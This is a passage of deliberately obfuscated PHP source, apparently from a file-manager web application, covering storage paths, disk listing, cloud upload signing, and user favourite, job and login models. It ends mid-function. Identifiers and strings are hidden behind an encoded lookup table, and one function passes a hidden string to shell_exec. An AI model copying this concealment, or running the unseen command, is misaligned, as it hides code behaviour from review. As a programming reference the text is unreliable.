(defined($ÛÚõŞı[1257])) { return; } define($ÛÚõŞı[1257], self::systemPath($ÛÚõŞı[1258])); define($ÛÚõŞı[1259], self::systemPath($ÛÚõŞı[1260])); define($ÛÚõŞı[1261], self::systemPath($ÛÚõŞı[1262])); define($ÛÚõŞı[1263], self::systemPath($ÛÚõŞı[1264])); IOHistory::bindEvent(); } public static function systemPath($Ş¨Àüô¨) { $ŞşÜğÀ¯ =& $_SERVER[® ¨Ä®ñ]; $§å‘Ûï = $ŞşÜğÀ¯[1265] . ucfirst($Ş¨Àüô¨); $¥¡Ûø— = Model($ŞşÜğÀ¯[752])->get($§å‘Ûï); if ($¥¡Ûø—) { return $¥¡Ûø—; } if ($Ş¨Àüô¨ == $ŞşÜğÀ¯[1258]) { $¥¡Ûø— = self::make(Model($ŞşÜğÀ¯[807])->systemRootPathAdd($ŞşÜğÀ¯[528])); } else { $¥¡Ûø— = self::systemPath($ŞşÜğÀ¯[1258]); $à™¶úåÖ = self::sourceID($¥¡Ûø—); $¥¡Ûø— = self::make(Model($ŞşÜğÀ¯[807])->mkdir($à™¶úåÖ, $Ş¨Àüô¨)); } Model($ŞşÜğÀ¯[752])->set($§å‘Ûï, $¥¡Ûø—); return $¥¡Ûø—; } public static function systemFolder($‚à„û‰Û) { $ˆûÜÇ† = IO_PATH_SYSTEM_SOURCE . $‚à„û‰Û; $ıÃƒÒâ = Cache::get($ˆûÜÇ†); if (!$ıÃƒÒâ) { $şí‡„Á = IO::infoFull($ˆûÜÇ†); if (!$şí‡„Á) { $ıÃƒÒâ = IO::mkdir($ˆûÜÇ†, REPEAT_SKIP); } else { $ıÃƒÒâ = $şí‡„Á[$_SERVER[® ¨Ä®ñ][78]]; } Cache::set($ˆûÜÇ†, $ıÃƒÒâ, 3600 * 10); } return $ıÃƒÒâ; } public static function defaultDriver() { return Model($_SERVER[® ¨Ä®ñ][749])->defaultDriver(); } public static function defaultIO() { $’¸º›¬ˆ =& $_SERVER[® ¨Ä®ñ]; $˜ù­á›¯ = self::defaultDriver(); return $’¸º›¬ˆ[1266] . $˜ù­á›¯[$’¸º›¬ˆ[392]] . $’¸º›¬ˆ[1255]; } public static function defaultDriverInit() { static $¯•å‹óõ = false; if ($¯•å‹óõ) { return $¯•å‹óõ; } $¯•å‹óõ = IO::init(self::defaultIO()); return $¯•å‹óõ; } public static function fileTypeList() { $„ÏÇ‡ñŸ =& $_SERVER[® ¨Ä®ñ]; $ÖûÇ‡± = $GLOBALS[$„ÏÇ‡ñŸ[6]][$„ÏÇ‡ñŸ[1267]]; foreach ($ÖûÇ‡± as $¡ÉÏİã‹ => $ò¶Òœí×) { $Ãô£îß = $„ÏÇ‡ñŸ[1268] . $¡ÉÏİã‹; $†°ÊÂØ… = LNG($Ãô£îß); if ($Ãô£îß != $†°ÊÂØ…) { $ÖûÇ‡±[$¡ÉÏİã‹][$„ÏÇ‡ñŸ[32]] = $†°ÊÂØ…; } } return $ÖûÇ‡±; } public static function diskList($ûüåÉµò = true) { $ŞÔ÷±‰Ï = $_SERVER[® ¨Ä®ñ][1269]; if ($ûüåÉµò) { $ÜÇµè¢û = Cache::get($ŞÔ÷±‰Ï); if (is_array($ÜÇµè¢û)) { return $ÜÇµè¢û; } } $ÜÇµè¢û = self::diskListGet(); Cache::set($ŞÔ÷±‰Ï, $ÜÇµè¢û, 60); return $ÜÇµè¢û; } public static function diskListGet() { $ÍÓ´éï€ =& $_SERVER[® ¨Ä®ñ]; $áäÜÕ–€ = array(); if ($GLOBALS[$ÍÓ´éï€[6]][$ÍÓ´éï€[1270]] == $ÍÓ´éï€[1271]) { $Ï¹éÌâ¶ = $ÍÓ´éï€[1272]; for ($ñ²ÆÅ™Ø = 0; $ñ²ÆÅ™Ø < strlen($Ï¹éÌâ¶); $ñ²ÆÅ™Ø++) { $üÎíÓœÜ = $Ï¹éÌâ¶[$ñ²ÆÅ™Ø] . $ÍÓ´éï€[1273]; if (file_exists($üÎíÓœÜ)) { $áäÜÕ–€[] = $üÎíÓœÜ; } } return $áäÜÕ–€; } if (!function_exists($ÍÓ´éï€[99])) { $áäÜÕ–€[] = $ÍÓ´éï€[817]; return $áäÜÕ–€; } $â½»ßŒÅ = explode($ÍÓ´éï€[226], shell_exec($ÍÓ´éï€[1274])); array_shift($â½»ßŒÅ); array_pop($â½»ßŒÅ); $ËÔŠøÉŒ = array($ÍÓ´éï€[1275], $ÍÓ´éï€[1276], $ÍÓ´éï€[1277], $ÍÓ´éï€[1278], $ÍÓ´éï€[1279], $ÍÓ´éï€[1280], $ÍÓ´éï€[1281], $ÍÓ´éï€[1282]); foreach ($â½»ßŒÅ as $‚µ›´) { $Š´…Ø = preg_split($ÍÓ´éï€[1283], $‚µ›´); $üÎíÓœÜ = $Š´…Ø[count($Š´…Ø) - 1]; if (!strstr($Š´…Ø[0], $ÍÓ´éï€[1284]) || !$üÎíÓœÜ) { continue; } $ê¹§”¼ = rtrim($üÎíÓœÜ, $ÍÓ´éï€[8]) . $ÍÓ´éï€[8]; if (in_array($ê¹§”¼, $ËÔŠøÉŒ)) { continue; } $áäÜÕ–€[] = $ê¹§”¼; } return $áäÜÕ–€; } public static function isSameDisk($›”Ÿ˜È‚, $¨ìÒ×¯) { $Ïûû„æ¡ =& $_SERVER[® ¨Ä®ñ]; if ($GLOBALS[$Ïûû„æ¡[6]][$Ïûû„æ¡[1270]] == $Ïûû„æ¡[1271]) { return strtolower(substr($›”Ÿ˜È‚, 0, 1)) == strtolower(substr($¨ìÒ×¯, 0, 1)); } $°²ÔÎ†Ö = self::diskList(); $ãä¸Å÷‡ = !1; $ìá…ù€† = !1; sort($°²ÔÎ†Ö); $°²ÔÎ†Ö = array_reverse($°²ÔÎ†Ö); $›”Ÿ˜È‚ = rtrim($›”Ÿ˜È‚, $Ïûû„æ¡[8]) . $Ïûû„æ¡[8]; $¨ìÒ×¯ = rtrim($¨ìÒ×¯, $Ïûû„æ¡[8]) . $Ïûû„æ¡[8]; foreach ($°²ÔÎ†Ö as $ ¡½Åæ”) { $öˆğ€ß€ = strlen($ ¡½Åæ”); if (!$ãä¸Å÷‡ && substr($›”Ÿ˜È‚, 0, $öˆğ€ß€) == $ ¡½Åæ”) { $ãä¸Å÷‡ = $ ¡½Åæ”; } if (!$ìá…ù€† && substr($¨ìÒ×¯, 0, $öˆğ€ß€) == $ ¡½Åæ”) { $ìá…ù€† = $ ¡½Åæ”; } if ($ãä¸Å÷‡ && $ìá…ù€†) { break; } } return $ãä¸Å÷‡ === $ìá…ù€†; } public static function transferType($ÕÜü…¸„, $æçæœË¹) { $ûéåÖ®À =& $_SERVER[® ¨Ä®ñ]; $äÉ¼£ë¨ = self::driverType($ÕÜü…¸„); $áî–‡í“ = self::driverType($æçæœË¹); if ($äÉ¼£ë¨[$ûéåÖ®À[33]] == $áî–‡í“[$ûéåÖ®À[33]] && $äÉ¼£ë¨[$ûéåÖ®À[1285]] == $áî–‡í“[$ûéåÖ®À[1285]]) { return $ûéåÖ®À[1286]; } if ($äÉ¼£ë¨[$ûéåÖ®À[33]] == $ûéåÖ®À[846] && $áî–‡í“[$ûéåÖ®À[33]] == $ûéåÖ®À[107]) { return $ûéåÖ®À[1181]; } if ($äÉ¼£ë¨[$ûéåÖ®À[33]] == $ûéåÖ®À[107] && $áî–‡í“[$ûéåÖ®À[33]] == $ûéåÖ®À[846]) { return $ûéåÖ®À[108]; } return $ûéåÖ®À[1287]; } public static function driverType($ŞÛÊÃñ) { $¯€‹‰„­ =& $_SERVER[® ¨Ä®ñ]; $Ã—£µ×š = str_replace($¯€‹‰„­[1288], $¯€‹‰„­[12], strtolower($ŞÛÊÃñ->getType())); if ($Ã—£µ×š == $¯€‹‰„­[740] || $Ã—£µ×š == $¯€‹‰„­[1289] || $Ã—£µ×š == $¯€‹‰„­[1290]) { $ŞÛÊÃñ = self::defaultDriverInit(); } else { if ($Ã—£µ×š == $¯€‹‰„­[1188] || $Ã—£µ×š == $¯€‹‰„­[1291]) { $ŞÛÊÃñ = IO::init($ŞÛÊÃñ->pathParse[$¯€‹‰„­[1135]]); } } $ò·’ª½ = $ŞÛÊÃñ->path; $Ã—£µ×š = str_replace($¯€‹‰„­[1288], $¯€‹‰„­[12], strtolower($ŞÛÊÃñ->getType())); if ($Ã—£µ×š == $¯€‹‰„­[107]) { return array($¯€‹‰„­[33] => $¯€‹‰„­[107], $¯€‹‰„­[1285] => $¯€‹‰„­[12], $¯€‹‰„­[78] => $ò·’ª½); } return array($¯€‹‰„­[33] => $¯€‹‰„­[846], $¯€‹‰„­[1285] => $ŞÛÊÃñ->pathDriver, $¯€‹‰„­[78] => $ò·’ª½); } public static function pathDriverType($ÀôĞâ•‘) { return $ÀôĞâ•‘ ? self::driverType(IO::init($ÀôĞâ•‘)) : !1; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($ÙÔ÷Œç¡) { parent::__construct($ÙÔ÷Œç¡); $this->signatureVersion($_SERVER[® ¨Ä®ñ][211]); } public function uploadFormData($ÎÏéÀÚş, $ëƒ­ë = 3600) { $„ëË‚‹ =& $_SERVER[® ¨Ä®ñ]; $°õ¹†íë = $„ëË‚‹[191]; $•ØØ‰€ï = $„ëË‚‹[227]; $Ááæ»—Ş = $„ëË‚‹[1292]; $çšïÉä… = gmdate($„ëË‚‹[1293], time() + $ëƒ­ë); $Ûæˆ…©¦ = (string) time() . $„ëË‚‹[71] . (string) (time() + $ëƒ­ë); $Ó®¼¯ùÁ = array($„ëË‚‹[1294] => $çšïÉä…, $„ëË‚‹[1295] => array(array($„ëË‚‹[1296] => $°õ¹†íë), array($„ëË‚‹[1297] => $this->bucket), array($„ëË‚‹[1298], $„ëË‚‹[1299], $„ëË‚‹[12]), array($„ëË‚‹[1300] => $Ááæ»—Ş), array($„ëË‚‹[1301] => $•ØØ‰€ï), array($„ëË‚‹[1302] => $this->accessKey), array($„ëË‚‹[1303] => $Ûæˆ…©¦))); $Ó®¼¯ùÁ = json_encode($Ó®¼¯ùÁ); $Áàâ§÷Ô = hash_hmac($„ëË‚‹[227], $Ûæˆ…©¦, $this->secret); $ê •ßÙ = sha1($Ó®¼¯ùÁ); $Á¸Ê¢Œå = hash_hmac($„ëË‚‹[227], $ê •ßÙ, $Áàâ§÷Ô); $—áŒ­ = array($„ëË‚‹[1296] => $°õ¹†íë, $„ëË‚‹[1300] => $Ááæ»—Ş, $„ëË‚‹[1304] => base64_encode($Ó®¼¯ùÁ), $„ëË‚‹[1301] => $•ØØ‰€ï, $„ëË‚‹[1302] => $this->accessKey, $„ëË‚‹[1305] => $Ûæˆ…©¦, $„ëË‚‹[1306] => $Á¸Ê¢Œå, $„ëË‚‹[174] => $this->getHost()); return $—áŒ­; } public function fileOutLink($Û¦é¹¶İ) { $ô—£Óİô =& $_SERVER[® ¨Ä®ñ]; if (substr($Û¦é¹¶İ, 0, 7) == $ô—£Óİô[1307]) { $Û¦é¹¶İ = $ô—£Óİô[1308] . substr($Û¦é¹¶İ, 7); } header($ô—£Óİô[158] . $Û¦é¹¶İ); die; } } goto bè¦°‘¸–Ø; cÃĞÈ¹İÈÁ: class UserFavModel extends ModelBase { protected $tableName = "\x75\163\145\x72\137\146\x61\166"; protected function cacheFunctionAlias($İ¶—ô®ú) { $€éí€ğ‚ =& $_SERVER[® ¨Ä®ñ]; return array($€éí€ğ‚[1915] => array(USER_ID, $€éí€ğ‚[2232])); } protected function listData() { $À®Àè‘œ =& $_SERVER[® ¨Ä®ñ]; $ÁÑÉ’»ô = array($À®Àè‘œ[1630] => USER_ID, $À®Àè‘œ[474] => 0); $‚»È—§– = $À®Àè‘œ[2233]; $‘åÊñÎÏ = $this->field($‚»È—§–)->where($ÁÑÉ’»ô)->order($À®Àè‘œ[2234])->select(); return $‘åÊñÎÏ ? $‘åÊñÎÏ : array(); } protected function resetCache() { } protected function listView() { $…©Ÿ•öå =& $_SERVER[® ¨Ä®ñ]; $”¢²—™û = $this->listData(); $ÉñİÙÄª = array_filter_by_field($”¢²—™û, $…©Ÿ•öå[33], $…©Ÿ•öå[408]); $ÃÄ¢“Ù = array_to_keyvalue($ÉñİÙÄª, $…©Ÿ•öå[12], $…©Ÿ•öå[78]); if (!$ÃÄ¢“Ù) { return $”¢²—™û; } $çëª†ì = 2000; $ªœÒıÆô = array($…©Ÿ•öå[409] => array($…©Ÿ•öå[410], $ÃÄ¢“Ù)); $û‚Ù•£Ó = Model($…©Ÿ•öå[807])->listSource($ªœÒıÆô, $çëª†ì); $û‚Ù•£Ó = array_merge($û‚Ù•£Ó[$…©Ÿ•öå[76]], $û‚Ù•£Ó[$…©Ÿ•öå[77]]); $û‚Ù•£Ó = array_to_keyvalue($û‚Ù•£Ó, $…©Ÿ•öå[394]); foreach ($”¢²—™û as $Ïì›÷¥ => $ãÉ­ãîÎ) { $ñš­Œ¦‘ = $û‚Ù•£Ó[$ãÉ­ãîÎ[$…©Ÿ•öå[78]]]; $ñš­Œ¦‘ = $ñš­Œ¦‘ ? $ñš­Œ¦‘ : array(); $”¢²—™û[$Ïì›÷¥] = array_merge($ñš­Œ¦‘, $ãÉ­ãîÎ); } return $”¢²—™û; } protected function addFav($ß¥ª«Û¬, $©Ñ™ŞÑ = '', $æğîàÒí = "\x73\157\165\162\x63\145") { $´Šó…şš =& $_SERVER[® ¨Ä®ñ]; $ÕĞæ“ğ = array($´Šó…şš[1630] => USER_ID, $´Šó…şš[474] => 0, $´Šó…şš[414] => $æğîàÒí, $´Šó…şš[413] => $ß¥ª«Û¬); if ($this->where($ÕĞæ“ğ)->find()) { return !1; } $ÕĞæ“ğ = array($´Šó…şš[1630] => USER_ID, $´Šó…şš[474] => 0); $•ÆÄğ”ú = $this->where($ÕĞæ“ğ)->max($´Šó…şš[1830]); if (!$•ÆÄğ”ú) { $•ÆÄğ”ú = 0; } if (!$©Ñ™ŞÑ && $æğîàÒí == $´Šó…şš[408]) { $ìéµôï = Model($´Šó…şš[1309])->where(array($´Šó…şš[409] => $ß¥ª«Û¬))->find(); if (!$ìéµôï) { return !1; } $©Ñ™ŞÑ = $ìéµôï[$´Šó…şš[32]]; } $©Ñ™ŞÑ = $this->getAutoName($©Ñ™ŞÑ); $‚º©¥¤À = array($´Šó…şš[1630] => USER_ID, $´Šó…şš[474] => 0, $´Šó…şš[412] => $©Ñ™ŞÑ, $´Šó…şš[413] => $ß¥ª«Û¬, $´Šó…şš[414] => $æğîàÒí, $´Šó…şš[1811] => $•ÆÄğ”ú + 1); return $this->add($‚º©¥¤À); } protected function remove($ªÖÓ‹ĞÇ) { $àç‘ì’ë =& $_SERVER[® ¨Ä®ñ]; $˜ğŸĞã­ = array($àç‘ì’ë[1630] => USER_ID, $àç‘ì’ë[411] => $ªÖÓ‹ĞÇ); return $this->where($˜ğŸĞã­)->delete(); } protected function removeByName($„À˜ú) { $ªˆïœ´Û =& $_SERVER[® ¨Ä®ñ]; $Ÿåºı› = array($ªˆïœ´Û[1630] => USER_ID, $ªˆïœ´Û[412] => $„À˜ú, $ªˆïœ´Û[474] => 0); return $this->where($Ÿåºı›)->delete(); } protected function rename($şáış£¯, $ÆËÒù»…) { $Àµ¾ÃÊ® =& $_SERVER[® ¨Ä®ñ]; if ($şáış£¯ == $ÆËÒù»…) { return !1; } $÷š„ºÙß = $this->getAutoName($ÆËÒù»…); if ($ÆËÒù»… != $÷š„ºÙß) { return !1; } $„Ì¼‰ï“ = array($Àµ¾ÃÊ®[1630] => USER_ID, $Àµ¾ÃÊ®[474] => 0, $Àµ¾ÃÊ®[32] => $şáış£¯); return $this->where($„Ì¼‰ï“)->save(array($Àµ¾ÃÊ®[32] => $ÆËÒù»…)); } protected function resetSort($Ö—”–”Î) { $Ï«ìÌ—» =& $_SERVER[® ¨Ä®ñ]; $Ö—”–”Î = is_array($Ö—”–”Î) ? $Ö—”–”Î : array(); $êªåªâ = array($Ï«ìÌ—»[1630] => USER_ID); for ($ò•í»ê = 0; $ò•í»ê < count($Ö—”–”Î); $ò•í»ê++) { $êªåªâ[$Ï«ìÌ—»[411]] = $Ö—”–”Î[$ò•í»ê]; $this->where($êªåªâ)->save(array($Ï«ìÌ—»[1811] => $ò•í»ê + 1)); } return !0; } protected function moveTop($ñ½‰Û—İ) { $ÖİÁÊ´¾ =& $_SERVER[® ¨Ä®ñ]; $€Îî÷‡ = array($ÖİÁÊ´¾[1630] => USER_ID, $ÖİÁÊ´¾[474] => 0); $Û¡éæ˜¤ = $this->where($€Îî÷‡)->where(array($ÖİÁÊ´¾[32] => $ñ½‰Û—İ))->find(); if (!$Û¡éæ˜¤) { return; } $ÕÈ„—˜Á = $this->field($ÖİÁÊ´¾[392])->where($€Îî÷‡)->order($ÖİÁÊ´¾[2234])->select(); $ÕÈ„—˜Á = array_to_keyvalue($ÕÈ„—˜Á, $ÖİÁÊ´¾[12], $ÖİÁÊ´¾[392]); $ã‹Îµ®ó = $ÕÈ„—˜Á; $ÕÈ„—˜Á = array_remove_value($ÕÈ„—˜Á, $Û¡éæ˜¤[$ÖİÁÊ´¾[392]]); array_unshift($ÕÈ„—˜Á, $Û¡éæ˜¤[$ÖİÁÊ´¾[392]]); return $this->resetSort($ÕÈ„—˜Á); } protected function moveBottom($ğ‘¡¥…) { $ãÔ³Şºó =& $_SERVER[® ¨Ä®ñ]; $°Çæ‡ = array($ãÔ³Şºó[1630] => USER_ID, $ãÔ³Şºó[474] => 0); $¤òÄÍ³Ä = $this->where($°Çæ‡)->max($ãÔ³Şºó[1830]); $öç¾Œ‡¡ = array($ãÔ³Şºó[1830] => $¤òÄÍ³Ä + 1); return $this->where($°Çæ‡)->where(array($ãÔ³Şºó[32] => $ğ‘¡¥…))->save($öç¾Œ‡¡); } private function getAutoName($ŠĞ©Ìœº) { $ÙØŞíú´ =& $_SERVER[® ¨Ä®ñ]; $‚Ô ‰º“ = array($ÙØŞíú´[1630] => USER_ID, $ÙØŞíú´[474] => 0); $¨ùœ’“â = $this->field($ÙØŞíú´[32])->where($‚Ô ‰º“)->select(); $¨ùœ’“â = array_to_keyvalue($¨ùœ’“â, $ÙØŞíú´[12], $ÙØŞíú´[32]); if (!$¨ùœ’“â || !in_array($ŠĞ©Ìœº, $¨ùœ’“â)) { return $ŠĞ©Ìœº; } for ($‡ÕÜŒ×³ = 0; $‡ÕÜŒ×³ < count($¨ùœ’“â); $‡ÕÜŒ×³++) { if (!in_array($ŠĞ©Ìœº . "\x28{$‡ÕÜŒ×³}\x29", $¨ùœ’“â)) { return $ŠĞ©Ìœº . "\50{$‡ÕÜŒ×³}\51"; } } return $ŠĞ©Ìœº . "\x28{$‡ÕÜŒ×³}\51"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\x6d\x2e\152\157\142\x4c\x69\x73\164"; public $field = array("\x6e\x61\155\145", "\144\x65\x73\143", "\x73\157\162\x74"); const JOB_KEY = "\163\145\x6c\x66\112\x6f\x62\114\151\163\164"; public function listData($Œ²ÚŞî = false, $ÂáäâÎõ = "\x73\x6f\162\x74", $½ ÂË¤¾ = false) { return parent::listData($Œ²ÚŞî, $ÂáäâÎõ, $½ ÂË¤¾); } public function remove($’ğ¦€´¡) { return parent::remove($’ğ¦€´¡); } public function add($ôñëŞ) { $âÆ–¥•© =& $_SERVER[® ¨Ä®ñ]; if ($this->findByName($ôñëŞ[$âÆ–¥•©[32]])) { return !1; } $ôñëŞ[$âÆ–¥•©[1830]] = $this->getSort(); return parent::insert($ôñëŞ); } private function getSort() { $š­ÊÓŸç =& $_SERVER[® ¨Ä®ñ]; $´’è°” = parent::listData(); $æ‰Èøëì = array_to_keyvalue($´’è°”, $š­ÊÓŸç[12], $š­ÊÓŸç[1830]); return empty($æ‰Èøëì) ? 0 : max($æ‰Èøëì) + 1; } public function update($Ûş¬±¢½, $¦“—¥) { $ŸÆ½†¥è =& $_SERVER[® ¨Ä®ñ]; $Ù™±•åÓ = parent::listData($Ûş¬±¢½); $ëÛÌµÇ£ = $this->findByName($¦“—¥[$ŸÆ½†¥è[32]]); if (!$Ù™±•åÓ || $ëÛÌµÇ£ && $ëÛÌµÇ£[$ŸÆ½†¥è[392]] != $Ù™±•åÓ[$ŸÆ½†¥è[392]]) { return !1; } return parent::update($Ûş¬±¢½, $¦“—¥); } public function setUserJob($ªÊ¶À„°, $©šë˜) { $Ğ³ÇúÄ… =& $_SERVER[® ¨Ä®ñ]; if (!is_array($©šë˜)) { $©šë˜ = array($©šë˜); } $£Ã¯…¦ = parent::listData(); $¨ß§å”Ê = array_to_keyvalue($£Ã¯…¦, $Ğ³ÇúÄ…[32]); $ß‡¬ŒÃ² = $Ğ³ÇúÄ…[373]; foreach ($©šë˜ as $˜™ÜÄ) { if ($¨ß§å”Ê[$˜™ÜÄ]) { $ß‡¬ŒÃ² .= $¨ß§å”Ê[$˜™ÜÄ][$Ğ³ÇúÄ…[392]] . $Ğ³ÇúÄ…[50]; } else { $Ì•ëøß¤ = $this->add($˜™ÜÄ); $ß‡¬ŒÃ² .= $Ì•ëøß¤ . $Ğ³ÇúÄ…[50]; } } $ß‡¬ŒÃ² = rtrim($ß‡¬ŒÃ², $Ğ³ÇúÄ…[50]); Model($Ğ³ÇúÄ…[529])->metaSet($ªÊ¶À„°, self::JOB_KEY, $ß‡¬ŒÃ²); } public function getUserJob($ÚÜıÉñ) { $¿ŸµÉÖö = Model($_SERVER[® ¨Ä®ñ][529])->metaGet($ÚÜıÉñ); return $this->getUserJobInfo($¿ŸµÉÖö[self::JOB_KEY]); } public function getUserJobInfo($âÇî²ò³) { $­Ù²§ƒÅ =& $_SERVER[® ¨Ä®ñ]; $Î–ûÆÄ = explode($­Ù²§ƒÅ[50], $âÇî²ò³); $ó‰¥€» = parent::listData(); $ó‰¥€» = array_remove_key($ó‰¥€», $­Ù²§ƒÅ[193]); $Ê²Ô„Àú = array(); foreach ($Î–ûÆÄ as $…¨µ¥›ß) { if (isset($ó‰¥€»[$…¨µ¥›ß])) { $Ê²Ô„Àú[] = $ó‰¥€»[$…¨µ¥›ß]; } } return $Ê²Ô„Àú; } } class UserModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72"; protected $tableMeta = array("\x74\x61\x62\x6c\145\x4e\141\x6d\145" => "\x75\x73\145\162\x5f\x6d\145\164\141", "\155\145\164\141\106\151\x65\154\144" => "\165\163\145\162\x49\104"); protected $simpleField = "\165\x73\x65\x72\111\x44\54\156\x69\x63\153\x4e\x61\155\145\54\x6e\141\x6d\145\54\141\166\x61\164\141\162\x2c\163\145\170\54\163\x74\141\164\165\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($êë¡şÈË) { $è‡„³ÜÑ =& $_SERVER[® ¨Ä®ñ]; $¢€ø®Ö½ = $è‡„³ÜÑ[2235]; return array($è‡„³ÜÑ[1884] => array($êë¡şÈË[0], $¢€ø®Ö½), $è‡„³ÜÑ[1886] => array($êë¡şÈË[0], $¢€ø®Ö½), $è‡„³ÜÑ[2236] => array($êë¡şÈË[0], $¢€ø®Ö½)); } protected function getInfo($ÖÔŒñ¿Ø, $»‘±šÀÚ = false) { $š—ÒÊÚ = $this->getInfoSimple($ÖÔŒñ¿Ø); if (!is_array($š—ÒÊÚ)) { return array(); } if ($»‘±šÀÚ) { return $this->_getInfoApply($š—ÒÊÚ); } return $this->cacheFunctionGet($_SERVER[® ¨Ä®ñ][1888], $ÖÔŒñ¿Ø); } protected function getInfoFull($í—Ã­Ÿö, $àÁƒÃ = false) { $µ´ö“‘ª = $this->getInfoSimple($í—Ã­Ÿö); if (!is_array($µ´ö“‘ª)) { return array(); } if ($àÁƒÃ) { return $this->_getInfoApply($µ´ö“‘ª, !0); } return $this->cacheFunctionGet($_SERVER[® ¨Ä®ñ][2237], $í—Ã­Ÿö); } private function _getInfoApply($¶Ÿ™Ã, $ş—İ‹Šú = false) { $İÜ‹§¤ =& $_SERVER[® ¨Ä®ñ]; if (!$¶Ÿ™Ã) { return $¶Ÿ™Ã; } $ÑØåº­Ã = md5($İÜ‹§¤[2238] . $¶Ÿ™Ã[$İÜ‹§¤[871]] . $İÜ‹§¤[2239] . $¶Ÿ™Ã[$İÜ‹§¤[32]]); $¶Ÿ™Ã = $this->_listDataApplyItem($¶Ÿ™Ã); $¤¿¼«Î× = Model($İÜ‹§¤[1309])->metaGet($¶Ÿ™Ã[$İÜ‹§¤[87]][$İÜ‹§¤[394]]); $¶Ÿ™Ã[$İÜ‹§¤[2240]] = $ÑØåº­Ã; $¶Ÿ™Ã[$İÜ‹§¤[87]][$İÜ‹§¤[2070]] = isset($¤¿¼«Î×[$İÜ‹§¤[2071]]) ? $¤¿¼«Î×[$İÜ‹§¤[2071]] : null; if ($ş—İ‹Šú) { $¶Ÿ™Ã[$İÜ‹§¤[456]] = $this->metaGet($¶Ÿ™Ã[$İÜ‹§¤[1639]]); } return $¶Ÿ™Ã; } protected function getInfoSimple($¦„Àı, $¤Á„ì¢û = false) { $ç¬Ô©²¢ =& $_SERVER[® ¨Ä®ñ]; if (!$¦„Àı) { return array(); } if ($¤Á„ì¢û) { $ÁÔ¾‚¿ = $this->where(array($ç¬Ô©²¢[1639] => intval($¦„Àı)))->find(); if (!is_array($ÁÔ¾‚¿)) { return array(); } $ÁÔ¾‚¿[$ç¬Ô©²¢[2241]] = Action($ç¬Ô©²¢[2242])->parseUrl($ÁÔ¾‚¿[$ç¬Ô©²¢[2241]]); return $ÁÔ¾‚¿; } return $this->cacheFunctionGet($ç¬Ô©²¢[1889], $¦„Àı); } protected function getInfoSimpleOuter($®’÷Š§) { $³¶¥ åÏ =& $_SERVER[® ¨Ä®ñ]; if (!$®’÷Š§ || $®’÷Š§ == 0) { return array($³¶¥ åÏ[1639] => $³¶¥ åÏ[190], $³¶¥ åÏ[32] => $³¶¥ åÏ[159] . LNG($³¶¥ åÏ[2243]) . $³¶¥ åÏ[527], $³¶¥ åÏ[2241] => STATIC_PATH . $³¶¥ åÏ[2244]); } $€ÏğœÚœ = $this->cacheFunctionGet($³¶¥ åÏ[1889], $®’÷Š§); $™Ğ”ìÓñ = array_field_key($€ÏğœÚœ, explode($³¶¥ åÏ[50], $this->simpleField)); if (!$™Ğ”ìÓñ) { return array($³¶¥ åÏ[1639] => $³¶¥ åÏ[1172], $³¶¥ åÏ[32] => $³¶¥ åÏ[159] . LNG($³¶¥ åÏ[2245]) . $³¶¥ åÏ[527], $³¶¥ åÏ[2241] => STATIC_PATH . $³¶¥ åÏ[2246]); } $™Ğ”ìÓñ[$³¶¥ åÏ[2241]] = Action($³¶¥ åÏ[2242])->parseUrl($™Ğ”ìÓñ[$³¶¥ åÏ[2241]]); return $™Ğ”ìÓñ; } protected function groupUser($±ìŒ±¡‘) { } public static function errorLang($¹¾Ÿóİ) { $…ƒŸúÀª =& $_SERVER[® ¨Ä®ñ]; $§Ş’İí‹ = array(self::ERROR_USER_NOT_EXISTS => $…ƒŸúÀª[2247], self::ERROR_USER_PASSWORD_ERROR => $…ƒŸúÀª[2248], self::ERROR_USER_EXIST_NAME => $…ƒŸúÀª[2249], self::ERROR_USER_EXIST_PHONE => $…ƒŸúÀª[2250], self::ERROR_USER_EXIST_EMAIL => $…ƒŸúÀª[2251], self::ERROR_USER_LOGIN_LOCK => $…ƒŸúÀª[2252], self::ERROR_IP_NOT_ALLOW => $…ƒŸúÀª[2253], self::ERROR_USER_EXIST_NICKNAME => $…ƒŸúÀª[2254]); return LNG($§Ş’İí‹[$¹¾Ÿóİ]); } public function getInfoByMeta($ÚÄİÜ¬, $²Ğ¨– ) { $šÑûÔéã =& $_SERVER[® ¨Ä®ñ]; $óµ•Æ˜ = Model($šÑûÔéã[2255])->where(array($šÑûÔéã[95] => $ÚÄİÜ¬, $šÑûÔéã[369] => $²Ğ¨– ))->find(); if ($óµ•Æ˜) { return $this->getInfo($óµ•Æ˜[$šÑûÔéã[1639]]); } return !1; } public function userLoginCheck($±Û‡·ùå, $¬•ë°á) { $úùó×Â¹ =& $_SERVER[® ¨Ä®ñ]; $¼°ÆåË = $this->userLoginFind($±Û‡·ùå); if (!$¼°ÆåË) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($¼°ÆåË[$úùó×Â¹[1639]], $¬•ë°á)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($¼°ÆåË[$úùó×Â¹[1639]]); } public function userLoginFind($Ÿ³‹†£) { $£œ–¢§ğ =& $_SERVER[® ¨Ä®ñ]; $¦ÑìĞÀ = array($£œ–¢§ğ[32] => $Ÿ³‹†£, $£œ–¢§ğ[2075] => $Ÿ³‹†£, $£œ–¢§ğ[300] => $Ÿ³‹†£, $£œ–¢§ğ[2256] => $Ÿ³‹†£, $£œ–¢§ğ[984] => $£œ–¢§ğ[986]); if ($this->nickNameRpt()) { unset($¦ÑìĞÀ[$£œ–¢§ğ[2075]]); } return $this->where($¦ÑìĞÀ)->find(); } public function clearCache($’ºË–Ã¥) { $æÅ¯®É =& $_SERVER[® ¨Ä®ñ]; $this->cacheFunctionClear($æÅ¯®É[1888], $’ºË–Ã¥); $this->cacheFunctionClear($æÅ¯®É[1889], $’ºË–Ã¥); $this->cacheFunctionClear($æÅ¯®É[2237], $’ºË–Ã¥); } public function userPasswordCheck($Šú’„, $âêš²…ë) { $Ôğˆôğë =& $_SERVER[® ¨Ä®ñ]; $¤²Î–Â“ = 